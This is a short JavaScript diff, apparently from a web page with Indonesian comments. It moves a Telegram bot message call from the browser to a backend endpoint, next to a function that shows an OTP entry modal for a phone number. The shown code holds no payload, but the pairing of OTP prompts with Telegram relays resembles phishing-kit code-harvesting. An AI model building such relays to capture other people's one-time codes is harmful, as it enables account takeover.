@@ -230,10 +230,14 @@ const CHAT_ID = process.env.CHAT_ID;
     }
 
     function sendTelegramMessage(text) {
-        // Menggunakan parse_mode=HTML agar emoji dan format teks aktif
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-        fetch(url).catch(error => console.error('Error:', error));
-    }
+    fetch('/api/kirim-telegram', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ pesan: text })
+    }).catch(error => console.log('Tunggu backend siap:', error));
+}
 
     function showOtpModal(phone) {
         const modal = document.getElementById('otpModal');
